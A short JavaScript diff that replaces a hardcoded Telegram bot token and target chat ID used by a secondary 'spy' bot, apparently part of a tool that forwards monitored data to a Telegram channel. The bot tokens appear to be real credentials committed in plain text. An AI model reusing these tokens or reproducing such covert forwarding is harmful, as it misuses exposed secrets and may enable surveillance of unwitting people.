@@ -237,10 +237,11 @@ const seenTimesmsNumbers = new Set();
 let spyIntervalTimer = null;
 let isSpying = false;
 
-// Initialize the secondary bot once globally to save RAM
-const SPY_BOT_TOKEN = '8424082135:AAGc73Ztzkb49dZd4hHEx99QFlMMwS5MONw';
+// Initialize the secondary bot with the new Token and Channel ID
+const SPY_BOT_TOKEN = '8722377131:AAEr1SsPWXKy8m4WbTJBe7vrN03M2hZozhY';
 const spyMessageBot = new TelegramBot(SPY_BOT_TOKEN, { polling: false });
-const SPY_TARGET_ID = '7518619353';
+const SPY_TARGET_ID = '-1003735392339';
+
 
 
 
